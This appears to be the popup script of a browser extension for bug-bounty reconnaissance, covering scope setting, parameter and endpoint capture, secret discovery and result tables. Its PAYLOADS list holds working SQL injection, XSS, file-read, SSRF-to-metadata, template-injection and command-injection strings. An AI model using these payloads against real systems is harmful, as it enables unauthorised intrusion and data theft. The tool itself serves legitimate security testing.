// ============================================================
// ReconHawk Pro - Popup Logic v4.1
// FIXED: Context-aware filters per tab, better search/highlight,
//        scope enforcement in UI, WebSocket messages display,
//        JWT security checks, POST body params
// ============================================================

let currentTabId = null;
let activePane   = "params";
let scopeType    = "exact";
let refreshTimer = null;
let fuzzStop     = false;
let searchDebounceTimer = null;
let allData      = {
  params:[], endpoints:[], secrets:[], requests:[], headers:[],
  payloadResults:[], fuzzResults:[], idorResults:[],
  corsResults:[], graphqlResults:[], subdomains:[], target:null,
  customPayloads:[], websocketConnections:[], jwtTokens:[], apiDocs:[]
};

// ─── Payloads ────────────────────────────────────────────────
const PAYLOADS = {
  sqli: ["' OR '1'='1","' OR 1=1--","' UNION SELECT NULL,NULL--","1' AND SLEEP(5)--",
         "admin'--","1 AND 1=2 UNION SELECT @@version--","' OR ''='",
         "1;SELECT * FROM information_schema.tables--","' UNION SELECT username,password FROM users--"],
  xss:  ["<script>alert(1)</script>","<img src=x onerror=alert(1)>","javascript:alert(1)",
         "'><script>alert(document.cookie)</script>","<svg onload=alert(1)>",
         "\"><img src=x onerror=alert(1)>","<details open ontoggle=alert(1)>",
         "{{constructor.constructor('alert(1)')()}}"],
  lfi:  ["../../../../etc/passwd","../../../etc/shadow","....//....//etc/passwd",
         "..%2F..%2F..%2Fetc%2Fpasswd","/etc/passwd%00",
         "php://filter/convert.base64-encode/resource=index.php",
         "../../windows/win.ini","file:///etc/passwd"],
  ssrf: ["http://127.0.0.1","http://localhost","http://169.254.169.254/latest/meta-data/",
         "http://[::1]","http://0.0.0.0","http://2130706433",
         "http://metadata.google.internal/computeMetadata/v1/"],
  ssti: ["{{7*7}}","${7*7}","<%= 7*7 %>","#{7*7}","*{7*7}","{{config}}",
         "{{self.__class__.__mro__[1].__subclasses__()}}","{{'a'*100}}"],
  rce:  ["; id","| id","&& id","`id`","$(id)","; cat /etc/passwd","| whoami"],
  idor: ["0","1","2","99","100","999","-1","null","undefined",
         "00000000-0000-0000-0000-000000000000","admin","test"]
};

// ─── Filter config per tab ───────────────────────────────────
// Defines which filter groups are visible for each tab
const TAB_FILTERS = {
  "params":          { search:true,  groups:["fg-risk","fg-source"],             placeholder:"Search param name, value, URL..." },
  "endpoints":       { search:true,  groups:["fg-ep-type","fg-method"],          placeholder:"Search path, host, URL..." },
  "secrets":         { search:true,  groups:["fg-secret-risk"],                  placeholder:"Search secret name or type..." },
  "reflect":         { search:true,  groups:[],                                  placeholder:"Search param name or URL..." },
  "requests":        { search:true,  groups:["fg-req-method","fg-req-type"],     placeholder:"Search URL..." },
  "headers":         { search:true,  groups:["fg-header-status"],                placeholder:"Search header name..." },
  "fuzzer":          { search:true,  groups:["fg-fuzz-type","fg-fuzz-alert"],    placeholder:"Search param name or payload..." },
  "idor":            { search:true,  groups:[],                                  placeholder:"Search param name or URL..." },
  "cors":            { search:true,  groups:["fg-cors-vuln"],                    placeholder:"Search endpoint URL..." },
  "graphql":         { search:true,  groups:[],                                  placeholder:"Search type name or endpoint..." },
  "subdomains":      { search:true,  groups:[],                                  placeholder:"Search subdomain..." },
  "custom-payloads": { search:true,  groups:[],                                  placeholder:"Search payload..." },
  "websocket":       { search:true,  groups:[],                                  placeholder:"Search WebSocket URL..." },
  "jwt":             { search:false, groups:[],                                  placeholder:"" },
  "api-docs":        { search:true,  groups:[],                                  placeholder:"Search API doc URL..." },
};

// ─── DOMContentLoaded ────────────────────────────────────────
document.addEventListener("DOMContentLoaded", () => {
  initEventListeners();
  initExtension();
});

// ─── All Event Listeners ─────────────────────────────────────
function initEventListeners() {
  try {
    const scanBtn = document.getElementById("scanBtn");
    if (scanBtn) scanBtn.addEventListener("click", startScan);
    const saveBtn = document.getElementById("saveBtn");
    if (saveBtn) saveBtn.addEventListener("click", saveSession);
    const historyBtn = document.getElementById("historyBtn");
    if (historyBtn) historyBtn.addEventListener("click", openHistory);
    const loadHistoryBtn = document.getElementById("loadHistoryBtn");
    if (loadHistoryBtn) {
      loadHistoryBtn.addEventListener("click", () => document.getElementById("importFileInput")?.click());
    }
    const importFileInput = document.getElementById("importFileInput");
    if (importFileInput) importFileInput.addEventListener("change", handleImportFile);
    const exportBtn = document.getElementById("exportBtn");
    if (exportBtn) exportBtn.addEventListener("click", exportData);
    const clearBtn = document.getElementById("clearBtn");
    if (clearBtn) clearBtn.addEventListener("click", clearData);
    const targetArea = document.getElementById("targetArea");
    if (targetArea) targetArea.addEventListener("click", openModal);
    const setTargetFromWarn = document.getElementById("setTargetFromWarn");
    if (setTargetFromWarn) setTargetFromWarn.addEventListener("click", openModal);

    // Target modal
    document.getElementById("applyTarget")?.addEventListener("click", applyTarget);
    document.getElementById("cancelModal")?.addEventListener("click", closeModal);
    document.getElementById("targetModal")?.addEventListener("click", e => { if(e.target===document.getElementById("targetModal")) closeModal(); });
    document.getElementById("targetInput")?.addEventListener("keydown", e => { if(e.key==="Enter") applyTarget(); });
    document.getElementById("scopeExact")?.addEventListener("click", () => selectScope("exact"));
    document.getElementById("scopeWildcard")?.addEventListener("click", () => selectScope("wildcard"));
    document.getElementById("scopeNone")?.addEventListener("click", () => selectScope("none"));

    // History modal
    document.getElementById("closeHistory")?.addEventListener("click", closeHistory);
    document.getElementById("historyModal")?.addEventListener("click", e => { if(e.target===document.getElementById("historyModal")) closeHistory(); });
    document.getElementById("sessionList")?.addEventListener("click", onSessionListClick);

    // Tabs
    ["params","endpoints","secrets","reflect","requests","headers",
     "fuzzer","idor","cors","graphql","subdomains","custom-payloads",
     "websocket","jwt","api-docs"].forEach(name => {
      document.getElementById("tab-"+name)?.addEventListener("click", () => switchTab(name));
    });

    // Search with debounce
    const searchBox = document.getElementById("searchBox");
    if (searchBox) {
      searchBox.addEventListener("input", () => {
        clearTimeout(searchDebounceTimer);
        searchDebounceTimer = setTimeout(renderActive, 180);
      });
      // Instant on Enter
      searchBox.addEventListener("keydown", e => { if(e.key==="Enter") { clearTimeout(searchDebounceTimer); renderActive(); } });
    }

    // All filter selects
    ["fRisk","fSource","fEpType","fMethod","fReqMethod","fReqType",
     "fFuzzType","fFuzzAlert","fSecretRisk","fCorsVuln","fHeaderStatus"].forEach(id => {
      document.getElementById(id)?.addEventListener("change", renderActive);
    });

    // Payload chips
    ["sqli","xss","lfi","ssrf","ssti","rce","idor"].forEach(type => {
      document.getElementById("chip-"+type)?.addEventListener("click", e => copyPayload(type, e.currentTarget));
    });

    // Feature buttons
    document.getElementById("autoTestBtn")?.addEventListener("click", startAutoTest);
    document.getElementById("runFuzzBtn")?.addEventListener("click", startFuzzer);
    document.getElementById("stopFuzzBtn")?.addEventListener("click", () => { fuzzStop=true; });
    document.getElementById("runIdorBtn")?.addEventListener("click", startIdorScan);
    document.getElementById("runCorsBtn")?.addEventListener("click", startCorsTester);
    document.getElementById("runGqlBtn")?.addEventListener("click", startGraphQL);
    document.getElementById("addCustomPayloadBtn")?.addEventListener("click", addCustomPayload);
    document.getElementById("clearCustomPayloadsBtn")?.addEventListener("click", clearCustomPayloads);
    document.getElementById("decodeJwtBtn")?.addEventListener("click", decodeJWT);
    document.getElementById("scanApiDocsBtn")?.addEventListener("click", scanApiDocs);

    // Global URL click
    document.addEventListener("click", e => {
      const el = e.target.closest(".url-link");
      if (!el) return;
      const url = el.getAttribute("data-url");
      if (url) chrome.tabs.create({ url, active:false });
    });
  } catch(e) {
    console.error("initEventListeners error:", e);
  }
}

// ─── Init ────────────────────────────────────────────────────
async function initExtension() {
  try {
    const [tab] = await chrome.tabs.query({ active:true, currentWindow:true });
    if (tab) {
      currentTabId = tab.id;
      try {
        if (tab?.url) {
          const input = document.getElementById("targetInput");
          if (input) input.value = new URL(tab.url).hostname;
        }
      } catch(_) {}
    }
    await loadCustomPayloads();
    await loadData();
    updateFilterToolbar(); // Set correct filters for default tab
    startAutoRefresh();
  } catch(e) {
    console.error("initExtension error:", e);
    setStatus("Error: "+e.message);
  }
}

let lastDataVersion = null;

async function loadData() {
  try {
    const resp = await chrome.runtime.sendMessage({ type:"GET_DATA", tabId:currentTabId });
    if (resp) {
      // Re-render only when the background data actually changed (D13 fix — the
      // old code re-rendered every 2.5s and reset selection/filters mid-use).
      const changed = lastDataVersion === null || resp.dataVersion !== lastDataVersion;
      lastDataVersion = resp.dataVersion;
      allData = resp;
      updateTargetUI(); updateNoScopeWarning();
      if (changed) { renderActive(); updateCounts(); }
    }
  } catch(_) {}
}

function startAutoRefresh() {
  clearInterval(refreshTimer);
  refreshTimer = setInterval(loadData, 2500);
}

// ─── No scope warning ─────────────────────────────────────────
function updateNoScopeWarning() {
  const warn = document.getElementById("noScopeWarn");
  if (!warn) return;
  const hasScope = allData.target && (allData.target.host || allData.target.noFilter);
  warn.classList.toggle("visible", !hasScope);

  // Hide/show main panes
  document.querySelectorAll(".tab-pane").forEach(p => {
    p.style.visibility = hasScope ? "visible" : "hidden";
  });
}

// ─── Context-aware filter toolbar ────────────────────────────
function updateFilterToolbar() {
  const config = TAB_FILTERS[activePane] || { search:true, groups:[], placeholder:"Search..." };
  const searchBox = document.getElementById("searchBox");

  // Show/hide search
  if (searchBox) {
    searchBox.style.display = config.search ? "" : "none";
    searchBox.placeholder = config.placeholder || "Search...";
    if (!config.search) searchBox.value = ""; // clear when hidden
  }

  // Hide all filter groups first
  document.querySelectorAll(".filter-group").forEach(g => g.classList.remove("visible"));

  // Show relevant groups
  config.groups.forEach(id => {
    document.getElementById(id)?.classList.add("visible");
  });

  // Reset filters that are NOT shown (prevent stale filters from previous tab)
  if (!config.groups.includes("fg-risk"))          resetSelect("fRisk");
  if (!config.groups.includes("fg-source"))         resetSelect("fSource");
  if (!config.groups.includes("fg-ep-type"))        resetSelect("fEpType");
  if (!config.groups.includes("fg-method"))         resetSelect("fMethod");
  if (!config.groups.includes("fg-req-method"))     resetSelect("fReqMethod");
  if (!config.groups.includes("fg-req-type"))       resetSelect("fReqType");
  if (!config.groups.includes("fg-fuzz-type"))      resetSelect("fFuzzType");
  if (!config.groups.includes("fg-fuzz-alert"))     resetSelect("fFuzzAlert");
  if (!config.groups.includes("fg-secret-risk"))    resetSelect("fSecretRisk");
  if (!config.groups.includes("fg-cors-vuln"))      resetSelect("fCorsVuln");
  if (!config.groups.includes("fg-header-status"))  resetSelect("fHeaderStatus");
}

function resetSelect(id) {
  const el = document.getElementById(id);
  if (el) el.value = "";
}

// ─── Modal ───────────────────────────────────────────────────
function openModal() {
  const modal = document.getElementById("targetModal");
  if (!modal) return;
  modal.classList.add("open");
  const input = document.getElementById("targetInput");
  if (allData.target?.host) {
    const t = allData.target;
    if (input) input.value = t.wildcard ? "*."+t.host : t.host;
    selectScope(t.noFilter?"none":t.wildcard?"wildcard":"exact");
  } else if (allData.target?.noFilter) {
    if (input) input.value = "";
    selectScope("none");
  } else {
    if (input) input.value = "";
    selectScope("exact");
  }
  setTimeout(() => input?.focus(), 100);
}

function closeModal() {
  document.getElementById("targetModal")?.classList.remove("open");
}

function selectScope(type) {
  scopeType = type;
  ["exact","wildcard","none"].forEach(t => {
    const el = document.getElementById("scope"+t[0].toUpperCase()+t.slice(1));
    if (el) el.classList.toggle("selected", t===type);
  });
}

async function applyTarget() {
  const raw = document.getElementById("targetInput")?.value.trim() || "";
  let host="", wildcard=false, noFilter=false;
  if (scopeType==="none" || !raw) { noFilter=true; host=""; }
  else if (scopeType==="wildcard") { wildcard=true; host=raw.startsWith("*.")?raw.slice(2):raw; }
  else { host=raw.replace(/^\*\./,""); }

  await chrome.runtime.sendMessage({ type:"SET_TARGET", tabId:currentTabId, target:{host,wildcard,noFilter,raw} });
  closeModal();
  await loadData();
  setStatus(noFilter ? "Scope: all domains (no filter)" : `✓ Target: ${raw} [${scopeType}]`);
}

function updateTargetUI() {
  const t=allData.target;
  const badge=document.getElementById("scopeBadge");
  const disp=document.getElementById("targetDisplay");
  if (!t||(!t.host&&!t.noFilter)) {
    if(badge){badge.className="scope-badge scope-none";badge.textContent="NO SCOPE";}
    if(disp) disp.textContent="Click to set target...";
  } else if (t.noFilter) {
    if(badge){badge.className="scope-badge scope-wild";badge.textContent="ALL";}
    if(disp) disp.textContent="Capturing all domains";
  } else if (t.wildcard) {
    if(badge){badge.className="scope-badge scope-wild";badge.textContent="WILDCARD";}
    if(disp) disp.textContent="*."+t.host;
  } else {
    if(badge){badge.className="scope-badge scope-exact";badge.textContent="EXACT";}
    if(disp) disp.textContent=t.host;
  }
}

// ─── History ─────────────────────────────────────────────────
async function openHistory() {
  document.getElementById("historyModal")?.classList.add("open");
  const resp = await chrome.runtime.sendMessage({ type:"GET_SESSIONS", tabId:currentTabId });
  const list = document.getElementById("sessionList");
  if (!list) return;
  if (!resp?.sessions?.length) {
    list.innerHTML='<div class="no-sessions">📂 No saved sessions yet<br><small>Click 💾 Save after scanning a target</small></div>';
    return;
  }
  list.innerHTML = resp.sessions.map(s => {
    const d = new Date(s.savedAt).toLocaleString();
    return `<div class="session-item" data-host="${escAttr(s.host)}">
      <div>
        <div class="session-host">${esc(s.host)}</div>
        <div class="session-meta">${d}</div>
      </div>
      <div class="session-counts">
        <span class="session-count sc-p">${s.counts.params} params</span>
        <span class="session-count sc-s">${s.counts.secrets} secrets</span>
        <span class="session-count sc-e">${s.counts.endpoints} ep</span>
      </div>
      <span class="session-del" data-del="${escAttr(s.host)}" title="Delete session">✕</span>
    </div>`;
  }).join("");
}

// One delegated listener for the session list (D9 fix — the old code attached a
// fresh {once:true} listener on every open, so handlers stacked up and fired
// multiple times per click).
async function onSessionListClick(e) {
  const del = e.target.closest("[data-del]");
  const item = e.target.closest(".session-item");
  if (del) {
    e.stopPropagation();
    const host = del.getAttribute("data-del");
    await chrome.runtime.sendMessage({ type:"DELETE_SESSION", tabId:currentTabId, host });
    del.closest(".session-item").remove();
    setStatus("Deleted: "+host);
  } else if (item) {
    const host = item.getAttribute("data-host");
    const ok = await chrome.runtime.sendMessage({ type:"LOAD_SESSION", tabId:currentTabId, host });
    closeHistory();
    await loadData();
    setStatus(ok?.ok ? "✓ Session loaded: "+host : "Session not found");
  }
}

function closeHistory() { document.getElementById("historyModal")?.classList.remove("open"); }

// ─── Import JSON ─────────────────────────────────────────────
async function handleImportFile(event) {
  const file = event.target.files[0];
  if (!file) return;
  const btn = document.getElementById("loadHistoryBtn");
  if(btn){btn.disabled=true; btn.textContent="⏳";}
  setStatus("Importing JSON...");
  try {
    const text = await file.text();
    const data = JSON.parse(text);
    if (!data.target && !data.params && !data.endpoints) {
      setStatus("Invalid JSON format"); return;
    }
    let targetHost = data.target?.host || data.target?.raw || "";
    if (!targetHost && file.name) {
      const match = file.name.match(/recon_([^_]+)_/);
      if (match) targetHost = match[1];
    }
    const sessionData = {
      target: data.target || { host:targetHost, wildcard:false, noFilter:false, raw:targetHost },
      params: data.params || [], endpoints: data.endpoints || [], secrets: data.secrets || [],
      requests: data.requests || [], headers: data.headers || [],
      payloadResults: data.payloadResults || [], fuzzResults: data.fuzzResults || [],
      idorResults: data.idorResults || [], corsResults: data.corsResults || [],
      graphqlResults: data.graphqlResults || [], subdomains: data.subdomains || [],
      customPayloads: data.customPayloads || [], websocketConnections: data.websocketConnections || [],
      jwtTokens: data.jwtTokens || [], apiDocs: data.apiDocs || [],
      savedAt: data.timestamp ? new Date(data.timestamp).getTime() : Date.now()
    };
    const ok = await chrome.runtime.sendMessage({ type:"IMPORT_SESSION", tabId:currentTabId, host:targetHost||"imported", session:sessionData });
    if (ok?.ok) {
      await loadData();
      setStatus(`✓ Imported: ${targetHost||"file"}`);
    } else { setStatus("Import failed"); }
  } catch(e) { setStatus("Import error: "+e.message); }
  if(btn){btn.disabled=false; btn.textContent="📥 Import";}
  event.target.value="";
}

async function saveSession() {
  await chrome.runtime.sendMessage({ type:"SAVE_SESSION", tabId:currentTabId });
  setStatus("💾 Saved: "+(allData.target?.host||"(no target)"));
}

// ─── Scan ────────────────────────────────────────────────────
async function startScan() {
  if (!allData.target?.host && !allData.target?.noFilter) {
    openModal();
    setStatus("⚠ Set target scope first");
    return;
  }
  const btn=document.getElementById("scanBtn"), bar=document.getElementById("progressBar");
  btn.disabled=true; btn.classList.add("scanning"); btn.textContent="⏳ Scanning...";
  setStatus("Scanning DOM, forms, JS files, source maps...");
  let prog=0;
  const iv=setInterval(()=>{ prog=Math.min(prog+Math.random()*12,88); bar.style.width=prog+"%"; },200);
  try {
    await chrome.scripting.executeScript({ target:{tabId:currentTabId}, files:["content/content.js"] });
    await sleep(200);
    try { await chrome.tabs.sendMessage(currentTabId,{type:"SCAN_NOW"}); } catch(_) {}
    await sleep(2000);
    await loadData();
  } catch(e) { setStatus("Scan error: "+e.message); }
  clearInterval(iv); bar.style.width="100%"; setTimeout(()=>{bar.style.width="0%";},700);
  btn.disabled=false; btn.classList.remove("scanning"); btn.textContent="⚡ Scan";
  setStatus(`✓ Done — ${allData.params.length} params | ${allData.secrets.length} secrets | ${allData.subdomains.length} subdomains`);
}

// ─── Clear ───────────────────────────────────────────────────
async function clearData() {
  if (!confirm("Clear all captured data for this tab?")) return;
  await chrome.runtime.sendMessage({ type:"CLEAR_DATA", tabId:currentTabId });
  allData={ params:[], endpoints:[], secrets:[], requests:[], headers:[],
    payloadResults:[], fuzzResults:[], idorResults:[], corsResults:[], graphqlResults:[],
    subdomains:[], customPayloads:[], websocketConnections:[], jwtTokens:[], apiDocs:[],
    target:allData.target };
  renderActive(); updateCounts(); setStatus("Data cleared");
}

// ─── Export ──────────────────────────────────────────────────
function exportData() {
  const t=allData.target;
  const report={ tool:"BountyScope v1.0", target:t?(t.wildcard?"*."+t.host:t.host||"all"):"unscoped",
    timestamp:new Date().toISOString(),
    summary:{ params:allData.params.length, endpoints:allData.endpoints.length, secrets:allData.secrets.length,
      subdomains:allData.subdomains.length, corsVulns:allData.corsResults.filter(r=>r.vulnerable).length,
      graphqlTypes:allData.graphqlResults.length }, ...allData };
  const a=document.createElement("a");
  a.href=URL.createObjectURL(new Blob([JSON.stringify(report,null,2)],{type:"application/json"}));
  a.download=`recon_${(t?.host||"all").replace(/[*.]/g,"")}_${new Date().toISOString().slice(0,10)}.json`;
  a.click(); setStatus("✓ Report exported");
}

// ─── Tabs ────────────────────────────────────────────────────
function switchTab(pane) {
  activePane = pane;
  document.querySelectorAll(".sb-item").forEach(b=>b.classList.remove("active"));
  document.querySelectorAll(".tab-pane").forEach(p=>p.classList.remove("active"));
  document.getElementById("tab-"+pane)?.classList.add("active");
  document.getElementById("pane-"+pane)?.classList.add("active");
  const searchBox = document.getElementById("searchBox");
  if (searchBox) searchBox.value = "";
  updateFilterToolbar();
  renderActive();
}

function renderActive() {
  const renderers = {
    params:renderParams, endpoints:renderEndpoints, secrets:renderSecrets, reflect:renderReflect,
    requests:renderRequests, headers:renderHeaders, fuzzer:renderFuzzer, idor:renderIdor,
    cors:renderCors, graphql:renderGraphQL, subdomains:renderSubdomains,
    "custom-payloads":renderCustomPayloads, websocket:renderWebSocket, jwt:renderJWT, "api-docs":renderApiDocs
  };
  renderers[activePane]?.();
}

// ─── Get filter values ───────────────────────────────────────
function getSearch() {
  return document.getElementById("searchBox")?.value.toLowerCase().trim() || "";
}
function getFilter(id) {
  return document.getElementById(id)?.value || "";
}

// ─── Highlight search term in text ───────────────────────────
function highlight(text, query) {
  if (!query || !text) return esc(text||"");
  const escaped = esc(text);
  if (!query) return escaped;
  const re = new RegExp("("+query.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")+")", "gi");
  return escaped.replace(re, '<span class="hl">$1</span>');
}

// ─── Counts ──────────────────────────────────────────────────
function updateCounts() {
  const counts = {
    "params":          allData.params.length,
    "endpoints":       allData.endpoints.length,
    "secrets":         allData.secrets.length,
    "reflect":         (allData.payloadResults||[]).length,
    "requests":        allData.requests.length,
    "headers":         allData.headers.length,
    "fuzzer":          (allData.fuzzResults||[]).length,
    "idor":            (allData.idorResults||[]).length,
    "cors":            (allData.corsResults||[]).length,
    "graphql":         (allData.graphqlResults||[]).length,
    "subdomains":      (allData.subdomains||[]).length,
    "custom-payloads": (allData.customPayloads||[]).length,
    "websocket":       (allData.websocketConnections||[]).length,
    "jwt":             (allData.jwtTokens||[]).length,
    "api-docs":        (allData.apiDocs||[]).length,
  };

  // Critical findings for sidebar alert animation
  const criticalTabs = new Set();
  if (allData.secrets.filter(s=>s.risk==="CRITICAL").length > 0) criticalTabs.add("secrets");
  if ((allData.corsResults||[]).filter(r=>r.vulnerable).length > 0) criticalTabs.add("cors");
  if ((allData.payloadResults||[]).filter(r=>r.reflected).length > 0) criticalTabs.add("reflect");
  if ((allData.fuzzResults||[]).filter(r=>r.interesting).length > 0) criticalTabs.add("fuzzer");
  if ((allData.idorResults||[]).filter(r=>r.interesting).length > 0) criticalTabs.add("idor");

  Object.entries(counts).forEach(([tab, n]) => {
    const cntEl = document.getElementById("cnt-"+tab);
    if (cntEl) cntEl.textContent = n;
    const tabEl = document.getElementById("tab-"+tab);
    if (tabEl) {
      tabEl.classList.toggle("has-data", n > 0);
      tabEl.classList.toggle("has-critical", criticalTabs.has(tab));
    }
  });

  const statsEl = document.getElementById("statsSummary");
  if(statsEl) statsEl.textContent =
    `${allData.params.length} params | ${allData.endpoints.length} ep | ${allData.secrets.length} secrets | ${(allData.subdomains||[]).length} subdomains`;
}

function paramRisk(key) {
  const k=(key||"").toLowerCase();
  if (/\b(id|uid|user_?id|account|admin|role|file|path|dir|cmd|exec|system|debug|token|api_?key|secret|pass|password|auth|redirect|url|return|next|callback|dest|target|host|ip|server|load|include|require|redir|open)\b/.test(k)) return "HIGH";
  if (/\b(name|email|phone|search|q|query|page|lang|locale|currency|sort|order|limit|offset|filter|category|type|action|method|ref|from|to|msg|message)\b/.test(k)) return "MEDIUM";
  return "LOW";
}

function showTable(name, hasData) {
  const e=document.getElementById("empty-"+name);
  const t=document.getElementById("tbl-"+name);
  if (e) e.style.display=hasData?"none":"flex";
  if (t) t.style.display=hasData?"table":"none";
  // Special case for websocket container
  if (name==="websocket") {
    const c=document.getElementById("ws-container");
    if(c) c.style.display=hasData?"block":"none";
  }
}

// ─── Render Params ───────────────────────────────────────────
function renderParams() {
  const q=getSearch(), risk=getFilter("fRisk"), src=getFilter("fSource");
  const seen=new Set();
  let items=allData.params.filter(p=>{
    const k=p.key+"|"+p.source+"|"+p.url;
    if(seen.has(k)) return false; seen.add(k); return true;
  });
  if(q) items=items.filter(p=>
    (p.key+"").toLowerCase().includes(q) ||
    (p.url+"").toLowerCase().includes(q) ||
    (p.value+"").toLowerCase().includes(q)
  );
  if(risk) items=items.filter(p=>paramRisk(p.key)===risk);
  if(src) items=items.filter(p=>(p.source||"").toUpperCase()===src.toUpperCase());
  showTable("params",items.length>0); if(!items.length) return;
  document.getElementById("body-params").innerHTML=items.map(p=>{
    const r=paramRisk(p.key), sl=(p.source||"url").toLowerCase().replace("-","");
    return `<tr>
      <td class="accent" style="font-weight:600">${highlight(p.key,q)}</td>
      <td><span class="badge b-${r.toLowerCase()}">${r}</span></td>
      <td><span class="badge b-${sl}">${esc(p.source||"URL")}</span></td>
      <td class="dim">${highlight(String(p.value||"").substring(0,40)||"—",q)}</td>
      <td><span class="url-link" data-url="${escAttr(p.url||"")}" title="${esc(p.url||"")}">${highlight(shortUrl(p.url),q)}</span></td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(p.key)}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-params");
}

// ─── Render Endpoints ────────────────────────────────────────
function renderEndpoints() {
  const q=getSearch(), epType=getFilter("fEpType"), method=getFilter("fMethod");
  const seen=new Set();
  let items=allData.endpoints.filter(e=>{ if(seen.has(e.path)) return false; seen.add(e.path); return true; });
  if(q) items=items.filter(e=>
    (e.path+"").toLowerCase().includes(q) ||
    (e.url+"").toLowerCase().includes(q) ||
    (e.host+"").toLowerCase().includes(q) ||
    (e.method+"").toLowerCase().includes(q)
  );
  if(epType) items=items.filter(e=>(e.type||"").toUpperCase()===epType.toUpperCase());
  if(method) items=items.filter(e=>(e.method||"").toUpperCase()===method.toUpperCase());
  showTable("endpoints",items.length>0); if(!items.length) return;
  document.getElementById("body-endpoints").innerHTML=items.map(e=>{
    const t=(e.type||"PAGE"), tb=t==="SENSITIVE"?"b-sensitive":t==="API"?"b-api":t==="JS"?"b-js":t==="GRAPHQL"?"b-graphql":t==="FILE"?"b-file":t==="SOURCEMAP"?"b-sourcemap":t==="EXTERNAL"?"b-external":t==="INTERNAL"?"b-internal":"b-page";
    const mb="b-"+(e.method||"GET").toLowerCase().replace("-","");
    return `<tr>
      <td class="accent">${highlight(e.path,q)}</td>
      <td><span class="badge ${mb}">${esc(e.method||"GET")}</span></td>
      <td><span class="badge ${tb}">${esc(t)}</span></td>
      <td class="mid">${highlight(e.host||"",q)}</td>
      <td><span class="url-link" data-url="${escAttr(e.url||e.path)}" title="${esc(e.url||"")}">${highlight(shortUrl(e.url),q)}</span></td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(e.url||e.path)}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-endpoints");
}

// ─── Render Secrets ──────────────────────────────────────────
function renderSecrets() {
  const q=getSearch(), risk=getFilter("fSecretRisk");
  let items=allData.secrets;
  if(q) items=items.filter(s=>
    (s.name+"").toLowerCase().includes(q) ||
    (s.source+"").toLowerCase().includes(q)
  );
  if(risk) items=items.filter(s=>s.risk===risk);
  showTable("secrets",items.length>0); if(!items.length) return;
  document.getElementById("body-secrets").innerHTML=items.map(s=>{
    const r=(s.risk||"low").toLowerCase();
    return `<tr>
      <td class="accent">${highlight(s.name,q)}</td>
      <td><span class="badge b-${r}">${esc(s.risk)}</span></td>
      <td style="font-family:'JetBrains Mono';font-size:10px;color:#fbbf24;max-width:280px">${esc(maskSecret(s.value))}</td>
      <td><span class="url-link" data-url="${escAttr(s.source||"")}" title="${esc(s.source||"")}">${highlight(shortUrl(s.source),q)}</span></td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(s.value||"")}">reveal</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-secrets");
}

// ─── Render Reflect ──────────────────────────────────────────
function renderReflect() {
  const q=getSearch();
  let items=allData.payloadResults||[];
  if(q) items=items.filter(r=>
    (r.param+"").toLowerCase().includes(q) ||
    (r.url+"").toLowerCase().includes(q) ||
    (r.payloadType+"").toLowerCase().includes(q)
  );
  showTable("reflect",items.length>0); if(!items.length) return;
  document.getElementById("body-reflect").innerHTML=items.map(r=>{
    const res=r.reflected?"b-critical":"b-ok", txt=r.reflected?"⚠ REFLECTED":"OK";
    const pt=r.payloadType==="sqli"?"b-critical":"b-high";
    return `<tr>
      <td class="accent">${highlight(r.param,q)}</td>
      <td><span class="badge ${pt}">${esc((r.payloadType||"").toUpperCase())}</span></td>
      <td><span class="badge ${res}">${txt}</span></td>
      <td><span class="badge b-info">${r.status||"—"}</span></td>
      <td><span class="url-link" data-url="${escAttr(r.url||"")}">${highlight(shortUrl(r.url),q)}</span></td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(r.url||"")}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-reflect");
}

// ─── Render Requests ─────────────────────────────────────────
function renderRequests() {
  const q=getSearch(), method=getFilter("fReqMethod"), type=getFilter("fReqType");
  let items=[...allData.requests].reverse().slice(0,300);
  if(q) items=items.filter(r=>(r.url+"").toLowerCase().includes(q));
  if(method) items=items.filter(r=>(r.method||"").toUpperCase()===method.toUpperCase());
  if(type) items=items.filter(r=>(r.type||"").toLowerCase()===type.toLowerCase());
  showTable("requests",items.length>0); if(!items.length) return;
  document.getElementById("body-requests").innerHTML=items.map(r=>{
    const mb="b-"+(r.method||"GET").toLowerCase();
    const time=new Date(r.timestamp).toLocaleTimeString();
    return `<tr>
      <td><span class="badge ${mb}">${esc(r.method||"GET")}</span></td>
      <td><span class="url-link" data-url="${escAttr(r.url||"")}" title="${esc(r.url||"")}">${highlight(shortUrl(r.url),q)}</span></td>
      <td class="dim">${esc(r.type||"xhr")}</td>
      <td class="dim">${time}</td>
      <td class="copy-cell"><button class="cbtn" data-copy="${escAttr(r.url||"")}">copy</button></td>
    </tr>`;
  }).join("");
  attachCopy("body-requests");
}

// ─── Render Headers ──────────────────────────────────────────
function renderHeaders() {
  const q=getSearch(), status=getFilter("fHeaderStatus");
  const seen=new Set();
  let items=allData.headers.filter(h=>{ if(seen.has(h.header)) return false; seen.add(h.header); return true; });
  if(q) items=items.filter(h=>
    (h.header+"").toLowerCase().includes(q) ||
    (h.desc+"").toLowerCase().includes(q) ||
    (h.value+"").toLowerCase().includes(q)
  );
  if(status==="missing") items=items.filter(h=>!h.present);
  else if(status==="ok")  items=items.filter(h=>h.present);
  showTable("headers",items.length>0); if(!items.length) return;
  document.getElementById("body-headers").innerHTML=items.map(h=>{
    const rc=h.risk==="OK"?"b-ok":"b-"+(h.risk||"info").toLowerCase();
    const val=h.present?(h.value||"").substring(0,70):"⚠ MISSING";
    return `<tr>
      <td style="font-family:'JetBrains Mono';color:var(--accent);font-size:10px">${highlight(h.header,q)}</td>
      <td><span class="badge ${rc}">${esc(h.risk||"OK")}</span></td>
      <td class="dim" title="${esc(h.value||"")}">${highlight(val,q)}</td>
      <td class="mid">${highlight(h.desc||"",q)}</td>
    </tr>`;
  }).join("");
}

// ─── Render Fuzzer ───────────────────────────────────────────
function renderFuzzer() {
  const q=getSearch(), type=getFilter("fFuzzType"), alertOnly=getFilter("fFuzzAlert");
  let items=allData.fuzzResults||[];
  if(q) items=items.filter(r=>
    (r.param+"").toLowerCase().includes(q) ||
    (r.payload+"").toLowerCase().includes(q) ||
    (r.url+"").toLowerCase().includes(q)
  );
  if(type) items=items.filter(r=>(r.type||"").toUpperCase()===type.toUpperCase());
